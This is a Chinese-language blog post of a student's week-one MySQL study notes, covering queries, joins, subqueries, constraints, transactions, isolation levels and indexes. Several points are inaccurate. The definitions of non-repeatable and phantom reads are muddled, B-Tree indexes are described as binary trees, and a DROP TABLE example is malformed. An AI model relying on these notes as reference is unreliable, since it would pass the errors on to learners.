    <article id="post-week1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/07/13/week1/" class="article-date">
  <time datetime="2023-07-13T14:50:14.000Z" itemprop="datePublished">2023-07-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/07/13/week1/">2023/07/10：夏令营week1记录:mysql笔记</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MySQL课堂笔记"><a href="#MySQL课堂笔记" class="headerlink" title="MySQL课堂笔记"></a>MySQL课堂笔记</h1><h2 id="0-标题暂定"><a href="#0-标题暂定" class="headerlink" title="0.标题暂定"></a>0.标题暂定</h2><h3 id="关于语句大小写"><a href="#关于语句大小写" class="headerlink" title="关于语句大小写"></a>关于语句大小写</h3><p>MySQL 在 windows 下是不区分大小写的，将 script 文件导入 MySQL 后表名也会自动转化为小写，结果再 想要将数据库导出放到 linux 服<br>务器中使用时就出错了。因为在 linux 下表名区分大小写而找不到表，查了很多都是说在 linux 下更改 MySQL 的设置使其也不区分大小写，但是<br>有没有办法反过来让 windows 下大小写敏感呢。其实方法是一样的，相应的更改 windows 中 MySQL 的设置就行了。</p>
<p>具体操作：<br>在 MySQL 的配置文件 my.ini 中增加一行：<br>lower_case_table_names = 0<br>其中 0：区分大小写，1：不区分大小写<br>MySQL 在 Linux 下数据库名、表名、列名、别名大小写规则是这样的：<br> 1、数据库名与表名是严格区分大小写的；<br> 2、表的别名是严格区分大小写的；<br> 3、列名与列的别名在所有的情况下均是忽略大小写的；<br> 4、变量名也是严格区分大小写的； MySQL 在 Windows 下都不区分大小写</p>
<h3 id="使用source-地址显示“Failed-to-open-file-‘…’-error-2”的可能原因"><a href="#使用source-地址显示“Failed-to-open-file-‘…’-error-2”的可能原因" class="headerlink" title="使用source + 地址显示“Failed to open file ‘…’, error: 2”的可能原因"></a>使用source + 地址显示“Failed to open file ‘…’, error: 2”的可能原因</h3><p>1.未先创建并”use”数据库；<br>2.在windows中，路径不能包含空格，中文字符，需使用“/”连接路径，且最好选择绝对路径；不可使用“.”以及“&lt;”和“&gt;”<br>3.该语句结尾不需分号<br>原文<a target="_blank" rel="noopener" href="https://sebhastian.com/mysql-failed-to-open-file-error-2/">https://sebhastian.com/mysql-failed-to-open-file-error-2/</a><br><a target="_blank" rel="noopener" href="https://philip.yurchuk.com/software/mysql-failed-to-open-file-error-2-and-22-on-windows/">https://philip.yurchuk.com/software/mysql-failed-to-open-file-error-2-and-22-on-windows/</a></p>
<h2 id="1-查看MYSQL版本"><a href="#1-查看MYSQL版本" class="headerlink" title="1.查看MYSQL版本"></a>1.查看MYSQL版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql --version</span><br><span class="line">$ mysql -V</span><br></pre></td></tr></table></figure>
<h2 id="2-创建及使用"><a href="#2-创建及使用" class="headerlink" title="2.创建及使用"></a>2.创建及使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ create database/table [name]</span><br><span class="line">$ use [name]</span><br></pre></td></tr></table></figure>
<h2 id="3-查询使用的数据库"><a href="#3-查询使用的数据库" class="headerlink" title="3.查询使用的数据库"></a>3.查询使用的数据库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ select database()</span><br></pre></td></tr></table></figure>
<h2 id="4-查询数据库版本"><a href="#4-查询数据库版本" class="headerlink" title="4.查询数据库版本"></a>4.查询数据库版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ select version()</span><br></pre></td></tr></table></figure>
<h2 id="5-终止输入语句"><a href="#5-终止输入语句" class="headerlink" title="5.终止输入语句"></a>5.终止输入语句</h2><p>键入 \c</p>
<h2 id="6-退出mysql"><a href="#6-退出mysql" class="headerlink" title="6.退出mysql"></a>6.退出mysql</h2><p>\q QUIT\EXIT<br>也可CTRL+C</p>
<h2 id="7-导入数据库"><a href="#7-导入数据库" class="headerlink" title="7.导入数据库"></a>7.导入数据库</h2><p>（创建并使用数据库后）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> [文件路径]（无需;）</span><br></pre></td></tr></table></figure>
<h2 id="8-查看"><a href="#8-查看" class="headerlink" title="8.查看"></a>8.查看</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ 表的结构 desc [table name]</span><br><span class="line">$ 数据库 show databases</span><br><span class="line">$ 查看表创建语句 show create table [table name]</span><br></pre></td></tr></table></figure>
<h2 id="9-简单查询"><a href="#9-简单查询" class="headerlink" title="9.简单查询"></a>9.简单查询</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ select [column name],[column name] from [table name]</span><br><span class="line">$ select * from [table name]</span><br></pre></td></tr></table></figure>
<h2 id="10-别名"><a href="#10-别名" class="headerlink" title="10.别名"></a>10.别名</h2><p>可以采用 as 关键字重命名表字段，其实 as 也可以省略，如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ select empno <span class="string">&quot;员工编号&quot;</span>, ename <span class="string">&quot;员工姓名&quot;</span>, sal*12 （as）<span class="string">&quot;年薪&quot;</span> from emp</span><br></pre></td></tr></table></figure>
<h2 id="11-条件查询"><a href="#11-条件查询" class="headerlink" title="11.条件查询"></a>11.条件查询</h2><p>条件查询需要用到 where 语句，where 必须放到 from 语句表的后面<br>支持如下运算符<br>运算符             说明<br>=                  等于<br>&lt;&gt;或!=             不等于<br>&lt;                  小于<br>&lt;=                 小于等于<br>&gt;                 大于<br>&gt;=                 大于等于<br>between …and …. 两个值之间,等同于 &gt;= and &lt;=<br>is null         为 null（is not null 不为空）<br>and             并且<br>or                 或者<br>in                 包含，相当于多个 or（not in 不在这个范围中）如:select * from emp where job in (‘manager’,’salesman’);<br>not not            可以取非，主要用在 is 或 in 中<br>like             like称为模糊查询，支持%或下划线匹配<br>                %匹配任意个字符<br>                下划线，一个下划线只匹配一个字符<br>                例如：select * from emp where ename like ‘_A%’;</p>
<h2 id="12-排序"><a href="#12-排序" class="headerlink" title="12.排序"></a>12.排序</h2><p>排序采用 order by 子句，order by 后面跟上排序字段，排序字段可以放多个，多个采用逗号间隔，order by 默认采用升<br>序，如果存在 where 子句那么 order by 必须放到 where 语句的后面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ 升序：order by [column name] asc</span><br><span class="line">$ 降序：order by [column name] desc</span><br></pre></td></tr></table></figure>
<h2 id="13-数据处理函数-单行处理函数"><a href="#13-数据处理函数-单行处理函数" class="headerlink" title="13.数据处理函数/单行处理函数"></a>13.数据处理函数/单行处理函数</h2><p>Lower         转换小写<br>upper         转换大写 如：upper(‘manager’)<br>substr        取子串（substr(被截取的字符串//[table name],起始下标,截取的长度)）<br>length           取长度 如：length([table name])<br>trim          去空格<br>str_to_date   将字符串转换成日期<br>                   如：select * from emp where HIREDATE=’1981-02-20’；<br>                （第二种方法，将字符串转换成 date 类型）<br>                select * from emp where HIREDATE=str_to_date(‘1981-02-20’,’%Y-%m-%d’);<br>                select * from emp where HIREDATE=str_to_date(‘02-20-1981’,’%m-%d-%Y’);<br>date_format   格式化日期 如：select empno, ename, date_format(hiredate, ‘%Y-%m-%d %H:%i:%s’) as hiredate from emp<br>format        设置千分位 如：select empno, ename, Format(sal, 0) from emp;<br>round         四舍五入  round(123.123)<br>rand()        生成随机数<br>Ifnull        可以将 null 转换成一个具体值<br>                如：ifnull(comm,0)<br>                  当comm为null替换为0</p>
<h2 id="14-日期格式"><a href="#14-日期格式" class="headerlink" title="14.日期格式"></a>14.日期格式</h2><p>now() 获得当前时间</p>
<h3 id="格式的说明"><a href="#格式的说明" class="headerlink" title="格式的说明"></a>格式的说明</h3><p>%Y：代表 4 位的年份<br>%y：代表 2 位的年份<br>%m：代表月, 格式为(01……12)<br>%c：代表月, 格式为(1……12)<br>%H：代表小时,格式为(00……23)<br>%h：代表小时,格式为(01……12)<br>%i：代表分钟, 格式为(00……59)<br>%r：代表 时间,格式为 12 小时(hh:mm:ss [AP]M)<br>%T：代表 时间,格式为 24 小时(hh:mm:ss)<br>%S：代表 秒,格式为(00……59)<br>%s：代表 秒,格式为(00……59)</p>
<h2 id="15-case-…-when-…-then-…-else-…end"><a href="#15-case-…-when-…-then-…-else-…end" class="headerlink" title="15.case … when … then …..else …end"></a>15.case … when … then …..else …end</h2><p>例如：<br>如果 job 为 MANAGERG 薪水上涨 10%,如果 job 为 SALESMAN 工资上涨 50%<br> select empno, ename, job, sal, case job when ‘MANAGER’ then sal<em>1.1 when ‘SALESMAN’ then sal</em>1.5 end as newsal from emp;</p>
<h2 id="16-分组函数-聚合函数-多行处理函数"><a href="#16-分组函数-聚合函数-多行处理函数" class="headerlink" title="16.分组函数/聚合函数/多行处理函数"></a>16.分组函数/聚合函数/多行处理函数</h2><p>未进行分组时整张表默认为一组<br>count      取得记录数   例如:count([table name]或*) *为一整行一个数据，这里相当于统计行数<br>sum        求和     注意：当例如select sum(sal+comm) from emp中comm中出现null,需替换null<br>avg        取平均<br>max        取最大的数<br>min        取最小的数</p>
<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>1.分组函数自动忽略空值(null)，不需要手动的加 where 条件排除空值。<br>select count(*) from emp where xxx;     符合条件的所有记录总数。(一行数据，只要不全为null则count++，当然不存在全为null的数据，有一位不是null则数据有效)<br>select count(comm) from emp;            comm 这个字段中不为空的元素总数。<br>2.分组函数不能直接使用在 where 关键字后面。<br>错误示范： mysql&gt; select ename,sal from emp where sal &gt; avg(sal);<br>原因见分组查询<br>3.所有分组函数可组合使用</p>
<h2 id="17-分组查询（重点）"><a href="#17-分组查询（重点）" class="headerlink" title="17.分组查询（重点）"></a>17.分组查询（重点）</h2><h3 id="什么是分组"><a href="#什么是分组" class="headerlink" title="什么是分组"></a>什么是分组</h3><p>   在实际的应用中，可能有这样的需求，需要先进行分组，然后对每一组的数据进行操作。</p>
<h3 id="关键字执行顺序"><a href="#关键字执行顺序" class="headerlink" title="关键字执行顺序"></a>关键字执行顺序</h3><pre><code>1. from
2. where
3. group by
4. select
5. order by
</code></pre>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>1.分组函数不能在where后：因为分组函数在使用的时候必须先分组之后才能使用，where执行的时候，还没有分组。所以where后面不能出现分组函数。<br>2.select sum(sal) from emp; 这个没有分组，为啥sum()函数可以用呢？   因为select在group by之后执行。<br>3.在一条select语句当中，如果有group by语句的话，select后面只能跟：参加分组的字段，以及分组函数。其它的一律不能跟。<br>4.可多个字段联合分组</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="1-group-by"><a href="#1-group-by" class="headerlink" title="1.group by"></a>1.group by</h4><p>   例：select job,deptno,sum(sal) from emp group by job,deptno;</p>
<h4 id="2-having"><a href="#2-having" class="headerlink" title="2.having"></a>2.having</h4><p>   对分组数据再进行过滤需要使用 having 子句<br>     优先考虑where过滤<br>   例：select job, avg(sal) from emp group by job having avg(sal) &gt;2000;<br>   顺序：根据条件查询数据 分组 采用 having 过滤，取得正确的数据</p>
<h2 id="18-distinct"><a href="#18-distinct" class="headerlink" title="18.distinct"></a>18.distinct</h2><p>把查询结果去除重复记录<br>distinct只能出现在所有字段的最前方:<br>select ename,distinct job from emp为错误形式<br>允许该形式：<br>count(distinct job) </p>
<h2 id="19-连接查询"><a href="#19-连接查询" class="headerlink" title="19.连接查询"></a>19.连接查询</h2><p>也可以叫跨表查询，需要关联多个表进行查询</p>
<h3 id="连接分类"><a href="#连接分类" class="headerlink" title="连接分类"></a>连接分类</h3><p>可分为：<br>        内连接：  （无主次，平等）<br>            等值连接        例：select e.ename,d.dname from emp e join dept d on e.deptno = d.deptno;<br>            非等值连接    例：select e.ename, e.sal, s.grade from emp e join salgrade s on e.sal between s.losal and s.hisal; // 条件不是一个等量关系，称为非等值连接。<br>            自连接（技巧：视为多张表）例：select a.ename as ‘员工名’, b.ename as ‘领导名’ from emp a join emp b on a.mgr = b.empno; //员工的领导编号 = 领导的员工编号<br>        外连接：          （可在join前加outer,如right outer join ）<br>            左外连接（左连接）<br>            右外连接（右连接）right代表什么：表示将join关键字右边的这张表看成主表，主要是为了将<br>                                                                     这张表的数据全部查询出来，捎带着关联查询左边的表。<br>                                                                     在外连接当中，两张表连接，产生了主次关系。<br>        全连接</p>
<h3 id="SQL92与SQLl99"><a href="#SQL92与SQLl99" class="headerlink" title="SQL92与SQLl99"></a>SQL92与SQLl99</h3><h4 id="SQL92语法："><a href="#SQL92语法：" class="headerlink" title="SQL92语法："></a>SQL92语法：</h4><pre><code>select 
    e.ename,d.dname
 from
     emp e, dept d
where
    e.deptno = d.deptno;
sql92的缺点：结构不清晰，表的连接条件，和后期进一步筛选的条件，都放到了where后面。
</code></pre>
<h4 id="SQL99语法："><a href="#SQL99语法：" class="headerlink" title="SQL99语法："></a>SQL99语法：</h4><pre><code>     select 
         ...
     from
        a
    (inner) join    //inner可以省略（带着inner可读性更好！！！一眼就能看出来是内连接）
        b
     on
        a和b的连接条件
    where
        筛选条件
sql99优点：表连接的条件是独立的，连接之后，如果还需要进一步筛选，再往后继续添加where
</code></pre>
<h2 id="20-多张表的连接查询"><a href="#20-多张表的连接查询" class="headerlink" title="20.多张表的连接查询"></a>20.多张表的连接查询</h2><p>语法：<br>select<br>    …<br> from<br>    a<br> join<br>    b<br> on<br>    a和b的连接条件<br> join<br>    c<br> on<br>    a和c的连接条件<br> right join<br>    d<br> on<br>    a和d的连接条件<br>   b,c,d并列<br>一条SQL中内连接和外连接可以混合。都可以出现</p>
<h2 id="21-子查询"><a href="#21-子查询" class="headerlink" title="21.子查询"></a>21.子查询</h2><p>子查询就是嵌套的 select 语句，可以理解为子查询是一张表</p>
<h3 id="where子查询"><a href="#where子查询" class="headerlink" title="where子查询"></a>where子查询</h3><p>格式：<br>select<br>        ..(select).<br>    from<br>        ..(select).<br>    where<br>        ..(select).<br>例：<br>第一步：查询最低工资是多少<br>select min(sal) from emp;<br>结果实例：<br>            +———-+<br>            | min(sal) |<br>            +———-+<br>            |   800.00 |<br>            +———-+<br>第二步：找出&gt;800的<br>select ename,sal from emp where sal &gt; 800;<br>第三步：合并<br>select ename,sal from emp where sal &gt; (select min(sal) from emp);</p>
<h3 id="from子查询"><a href="#from子查询" class="headerlink" title="from子查询"></a>from子查询</h3><p>注意：from后面的子查询，可以将子查询的查询结果当做一张临时表。<br>例：找出每个岗位的平均工资的薪资等级。<br>第一步：找出每个岗位的平均工资（按照岗位分组求平均值）<br>        select job,avg(sal) from emp group by job;<br>        +———–+————-+<br>        | job       | avgsal      |<br>        +———–+————-+   t表<br>        | ANALYST   | 3000.000000 |<br>        …<br>        +———–+————-+<br>第二步：克服心理障碍，把以上的查询结果就当做一张真实存在的表t。<br>        select * from salgrade;<br>    +——-+——-+——-+<br>    | GRADE | LOSAL | HISAL |<br>    +——-+——-+——-+   s表<br>    |     1 |   700 |  1200 |<br>    |     2 |  1201 |  1400 |<br>    …<br>    t表和s表进行表连接，条件：t表avg(sal) between s.losal and s.hisal;<br>        select<br>            t.*, s.grade<br>        from<br>            (select job,avg(sal) as avgsal from emp group by job) t<br>        join<br>            salgrade s<br>        on<br>            t.avgsal between s.losal and s.hisal;  // 技巧：avg(sal) as avgsal,否则t.avg(sal)报错</p>
<h3 id="select子查询（非重点）"><a href="#select子查询（非重点）" class="headerlink" title="select子查询（非重点）"></a>select子查询（非重点）</h3><p>对于select后面的子查询来说，这个子查询只能一次返回1条结果(就是括号里面那个)<br>例：<br> select e.ename,e.deptno,(select d.dname from dept d where e.deptno = d.deptno) as dname from emp e;</p>
<h2 id="22-union"><a href="#22-union" class="headerlink" title="22.union"></a>22.union</h2><p>union可以减少匹配的次数。在减少匹配次数的情况下，还可以完成两个结果集的拼接。<br>例：<br>select ename,job from emp where job = ‘MANAGER’<br>union<br>select ename,job from emp where job = ‘SALESMAN’;</p>
<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>1.union在进行结果集合并的时候，要求两个结果集的列数相同（查询字段对应个数相同）。<br>2.不同于oracle，mysql允许结果集合并时列和列的数据类型不一致。</p>
<h2 id="23-limit"><a href="#23-limit" class="headerlink" title="23.limit"></a>23.limit</h2><p>将查询结果集的一部分取出来。通常使用在分页查询当中。分页的作用是为了提高用户的体验。</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>完整用法：limit startIndex, length<br>        startIndex是起始下标，length是长度。<br>        起始下标从0开始。<br>缺省用法：limit 5; 这是取前5<br>     limit 1,2; 从第二条（下标为1）开始取两条数据<br>注意：mysql当中limit在order by之后执行</p>
<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>每页显示3条记录<br>    第1页：limit 0,3        [0 1 2]<br>    第2页：limit 3,3        [3 4 5]<br>    …<br>每页显示pageSize条记录<br>    第pageNo页：limit (pageNo - 1) * pageSize  , pageSize<br>    public static void main(String[] args){<br>        // 用户提交过来一个页码，以及每页显示的记录条数<br>        int pageNo = 5; //第5页<br>        int pageSize = 10; //每页显示10条</p>
<pre><code>    int startIndex = (pageNo - 1) * pageSize;
    String sql = &quot;select ...limit &quot; + startIndex + &quot;, &quot; + pageSize;
&#125;
</code></pre>
<p>记公式：limit (pageNo-1)*pageSize , pageSize</p>
<h2 id="24-语句总结与运行顺序"><a href="#24-语句总结与运行顺序" class="headerlink" title="24.语句总结与运行顺序"></a>24.语句总结与运行顺序</h2><p>总：select … from … where … group by … having … order by … limit …<br>顺序：1.from 2.where 3.group by 4.having 5.select 6.order by 7.limit..</p>
<h2 id="25-建表"><a href="#25-建表" class="headerlink" title="25.建表"></a>25.建表</h2><h3 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h3><p>create table tableName(<br> columnName dataType(length),<br> ………………..<br> columnName dataType(length)<br>);</p>
<h3 id="MySQL常用数据类型"><a href="#MySQL常用数据类型" class="headerlink" title="MySQL常用数据类型"></a>MySQL常用数据类型</h3><p>类型<br>Char(长度)                            定长字符串，存储空间大小固定，适合作为主键或外键<br>Varchar(长度)                        变长字符串，存储空间等于实际数据空间<br>double(有效数字位数，小数位)     数值型<br>Float(有效数字位数，小数位)      数值型<br>Int(长度)                          整型<br>bigint(长度)                     长整型<br>Date                               日期型<br>BLOB                             Binary Large OBject（二进制大对象）<br>CLOB                             Character Large OBject（字符大对象）</p>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>添加修改字段：alter table [table name] add [column name] <a href="length">datatype</a>;<br>            alter table [table name] modify [column name] <a href="length">datatype</a> ;<br>         alter table [table name] drop [column name];<br>表复制：create table … as …<br>删除表：drop table if [table name];// 如果这张表存在的话，删除<br>插入数据：insert into 表名(字段名1,字段名2,字段名3…) values(值1,值2,值3);字段名和值数量数据类型对应，没有给其它字段指定值的话，默认值是NULL。若省略前面的字段名，等于都写上，所以值也要都写上</p>
<h3 id="插入日期注意格式转换"><a href="#插入日期注意格式转换" class="headerlink" title="插入日期注意格式转换"></a>插入日期注意格式转换</h3><p>str_to_date(‘字符串日期’, ‘日期格式’)：将字符串varchar类型转换成date类型<br>date_format(日期类型数据, ‘日期格式’)：将date类型转换成具有一定格式的varchar字符串类型。<br>命名规范：所有的标识符都是全部小写，单词和单词之间使用下划线进行衔接。<br>mysql默认的日期格式：’%Y-%m-%d’<br>date是短日期：只包括年月日信息。默认：%Y-%m-%d<br>datetime是长日期：包括年月日时分秒信息。默认:%Y-%m-%d %h:%i:%s</p>
<h2 id="26-表的修改与删除"><a href="#26-表的修改与删除" class="headerlink" title="26.表的修改与删除"></a>26.表的修改与删除</h2><p>修改：update 表名 set 字段名称 1=需要修改的值 1, 字段名称 2=需要修改的值 2 where …<br>删除：Delete from 表名 where … 数据在硬盘上的真实存储空间不会被释放，可恢复<br>      truncate table 表名;  不可恢复，快速</p>
<h2 id="27-约束（重点）"><a href="#27-约束（重点）" class="headerlink" title="27.约束（重点）"></a>27.约束（重点）</h2><p>目的：创建表的时候，给表中的字段加上一些约束保证表中的数据有效完整</p>
<h3 id="类型："><a href="#类型：" class="headerlink" title="类型："></a>类型：</h3><p>非空约束：not null<br>唯一性约束: unique<br>主键约束: primary key （简称PK）<br>外键约束：foreign key（简称FK）<br>检查约束：check（mysql不支持，oracle支持）</p>
<h3 id="非空约束"><a href="#非空约束" class="headerlink" title="非空约束"></a>非空约束</h3><p>非空约束not null约束的字段不能为NULL。<br>例：create table t_vip(<br>        id int,<br>        name varchar(255) not null  // not null只有列级约束，没有表级约束！<br>    );</p>
<h3 id="唯一性约束"><a href="#唯一性约束" class="headerlink" title="唯一性约束"></a>唯一性约束</h3><p>唯一性约束unique约束的字段不能重复，但是可以为NULL。<br>例：create table t_vip(<br>        id int,<br>        name varchar(255) unique,<br>        email varchar(255)<br>    );</p>
<h3 id="表级约束"><a href="#表级约束" class="headerlink" title="表级约束"></a>表级约束</h3><p>需要给多个字段联合起来添加某一个约束的时候，需要使用表级约束。<br>例：create table t_vip(<br>                id int,<br>                name varchar(255),<br>                email varchar(255),<br>                unique(name,email)<br>)<br>在MySQL中，unique 和not null联合自动变成主键字段。例：name varchar(255) not null unique</p>
<h3 id="列级约束"><a href="#列级约束" class="headerlink" title="列级约束"></a>列级约束</h3><p>例：id int primary key</p>
<h3 id="主键约束（primary-key，简称PK）"><a href="#主键约束（primary-key，简称PK）" class="headerlink" title="主键约束（primary key，简称PK）"></a>主键约束（primary key，简称PK）</h3><p>主键字段：该字段上添加了主键约束，这样的字段叫做：主键字段<br>主键值：主键字段中的每一个值都叫做主键值，一般数字且定长<br>作用：主键值是每一行记录的唯一标识，相当于身份证号，任何一张表都应该有主键，没有主键，表无效<br>复合主键：primary key(id,name)多个字段联合起来做约束（不建议使用）<br>在mysql当中，有一种机制，可以帮助我们自动维护一个主键值<br>create table t_vip(<br>            id int primary key auto_increment, //auto_increment表示自增，从1开始，以1递增！<br>            name varchar(255)<br>        );</p>
<h3 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h3><p>外键主要是维护表之间的关系的，主要是为了保证参照完整性，如果表中的某个字段为外键字段，那么该字段的值必须来源于参照的表的字段<br>存在外键的表就是子表，参照的表就是父表，所以存在一个父子关系，也就是主从关系<br>删除表的顺序：先删子，再删父；<br>创建表的顺序：先创建父，再创建子。<br>删除数据的顺序：先删子，再删父。<br>插入数据的顺序：先插入父，再插入子。<br>子表中的外键引用的父表中的某个字段，被引用的这个字段不一定是主键，但至少具有unique约束。<br>外键值可为null<br>例：constraint [table name] foreign key([column name]) references [table name]([column name])<br>更改删除父表数据，子表也会变动</p>
<h3 id="约束的更改"><a href="#约束的更改" class="headerlink" title="约束的更改"></a>约束的更改</h3><p>删除：外键：alter table 表名 drop foreign key 外键字段;<br>     主键：alter table 表名 drop primary key;<br>         唯一：alter table 表名 drop index 字段名<br>添加： alter table 表名 add constraint 约束名 约束类型(字段名) [外键的引用]</p>
<h2 id="28-存储引擎（了解）"><a href="#28-存储引擎（了解）" class="headerlink" title="28.存储引擎（了解）"></a>28.存储引擎（了解）</h2><p>存储引擎是MySQL中特有的一个术语，实际上存储引擎是一个表存储/组织数据的方式。不同的存储引擎，表存储数据的方式不同。<br>在创建表时，可使用 ENGINE 选项为 CREATE TABLE 语句显式指定存储引擎。未指定则默认<br>常用引擎：MyISAM InnoDB MEMORY</p>
<h2 id="29-事务（重点）"><a href="#29-事务（重点）" class="headerlink" title="29.事务（重点）"></a>29.事务（重点）</h2><p>一个事务其实就是一个完整的业务逻辑。是一个最小的工作单元。不可再分。<br>本质上事务就是批量的DML语句（insert、delete、update 对数据进行更改）同时成功，或者同时失败</p>
<h3 id="事务工作过程"><a href="#事务工作过程" class="headerlink" title="事务工作过程"></a>事务工作过程</h3><p>InnoDB存储引擎：提供一组用来记录事务性活动的日志文件<br>在事务的执行过程中，每一条DML的操作都会记录到“事务性活动的日志文件”中。在事务的执行过程中，我们可以提交事务，也可以回滚事务。<br>提交事务：清空事务性活动的日志文件，将数据全部彻底持久化到数据库表中。标志着事务的结束。并且是一种全部成功的结束。<br>回滚事务：将之前所有的DML操作全部撤销，并且清空事务性活动的日志文件。标志着事务的结束。并且是一种全部失败的结束。</p>
<h3 id="事务执行"><a href="#事务执行" class="headerlink" title="事务执行"></a>事务执行</h3><p>开始事务：start transaction（关闭DML自动提交，此句开始保持上一次提交点）;<br>提交事务：commit; 语句<br>回滚事务：rollback; 语句（回滚永远都是只能回滚到上一次的提交点）<br>默认每执行一条DML自动提交</p>
<h3 id="事务特性"><a href="#事务特性" class="headerlink" title="事务特性"></a>事务特性</h3><p>原子性：说明事务是最小的工作单元。不可再分。<br>一致性：所有事务要求，在同一个事务当中，所有操作必须同时成功，或者同时失败，以保证数据的一致性。<br>隔离性：A事务和B事务之间具有一定的隔离。教室A和教室B之间有一道墙，这道墙就是隔离性。A事务在操作一张表的时候，另一个事务B也操作这张表会那样<br>持久性：事务最终结束的一个保障。事务提交，就相当于将没有保存到硬盘上的数据保存到硬盘上</p>
<h3 id="事务隔离性"><a href="#事务隔离性" class="headerlink" title="事务隔离性"></a>事务隔离性</h3><p>4个级别<br>读未提交：read uncommitted（最低的隔离级别）事务A可以读取到事务B未提交的数据。<br>读已提交：read committed （数据库隔离级别默认从此开始）事务A只能读取到事务B提交之后的数据。数据真实<br>可重复读：repeatable read （mysql中默认）事务A开启之后，不管是多久，每一次在事务A中读取到的数据都是一致的。即使事务B将数据已经修改，并且提交了，事务A读取到的数据还是没有发生改变<br>序列化/串行化：serializable（最高的隔离级别）事务排队，不能并发（我操作你停） synchronized，线程同步（事务同步）将一个事务与其他事务完全地隔离。效率最低</p>
<h3 id="一致性问题"><a href="#一致性问题" class="headerlink" title="一致性问题"></a>一致性问题</h3><p>脏读现象：读到脏数据（未提交的数据）<br>不可重复读：事务A开启之后，不管是多久，每一次在事务A中读取到的数据都是一致的。即使事务B将数据已经修改，并且提交了<br>幻像读：读到的数据可能不够绝对真实，即使事务B将数据已经修改，并且提交了，事务A读取到的数据还是没有发生改变</p>
<h3 id="隔离级别与一致性问题关系"><a href="#隔离级别与一致性问题关系" class="headerlink" title="隔离级别与一致性问题关系"></a>隔离级别与一致性问题关系</h3><p>隔离级别     脏读取     不可重复读        幻像读<br>读未提交     可能          可能            可能<br>读已提交    不可能       可能            可能<br>可重复读     不可能      不可能        对InnoDB不可能<br>序列化       不可能        不可能        不可能</p>
<h3 id="设置隔离级别"><a href="#设置隔离级别" class="headerlink" title="设置隔离级别"></a>设置隔离级别</h3><p>会话级：mysql&gt; SET TRANSACTION ISOLATION …；<br>            或：<br>       mysql&gt; SET SESSION TRANSACTION ISOLATION LEVEL …；<br>全局级：mysql&gt; SET GLOBAL TRANSACTION ISOLATION LEVEL …；</p>
<h3 id="查看隔离级别"><a href="#查看隔离级别" class="headerlink" title="查看隔离级别"></a>查看隔离级别</h3><p>mysql&gt; SELECT @@tx_isolation;或：<br>mysql&gt; SELECT @@session.tx_isolation;<br>– 查看全局级的当前隔离级别：<br>mysql&gt; SELECT @@global.tx_isolation;</p>
<h2 id="30-索引"><a href="#30-索引" class="headerlink" title="30.索引"></a>30.索引</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>索引是在数据库表的字段上添加的，是为了提高查询效率存在的一种机制。索引被用来快速找出在一个列上用一特定值的行。一张表的一个字段可以添加一个索引，当然，多个字段联合起来也可以添加索引。索引相当于一本书的目录，是为了缩小扫描范围而存在的一种机制。<br>MySQL在查询方面主要就是两种方式：第一种方式：全表扫描（无索引时的查找方式，效率较低）；第二种方式：根据索引检索。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在mysql当中索引是一个B-Tree数据结构。<br>遵循左小又大原则存放。采用中序遍历方式遍历取数据。<br>底层是一个自平衡的二叉树<br>注意：1.任何数据库主键自动添加索引，mysql如果有unique约束也会自动创建<br>2.在任何数据库当中，任何一张表的任何一条记录在硬盘存储上都有一个硬盘的物理存储编号<br>3.在mysql当中，索引是一个单独的对象，在mysql当中都是一个树的形式存在。（自平衡二叉树：B-Tree）不同存储引擎形式不同</p>
<h3 id="应用条件"><a href="#应用条件" class="headerlink" title="应用条件"></a>应用条件</h3><p>1.表中该字段中的数据量庞大<br>2.经常被检索，经常出现在 where 子句中的字段<br>3.经常被 DML 操作的字段不建议添加索引（增删改后要重新排序）<br>4.索引需维护，不随意添加<br>5.唯一性比较弱的字段上添加索引用处不大。</p>
<h3 id="索引应用"><a href="#索引应用" class="headerlink" title="索引应用"></a>索引应用</h3><p>建立：create index 索引名 on 表名(字段名);<br>     alter table 表名 add unique index 索引名 (列名);<br>删除：DROP INDEX 索引名 ON 表名<br>         ALTER TABLE 表名 DROP INDEX 索引名<br>查看索引：show index from 表名;<br>通过扫描次数判断是否使用索引</p>
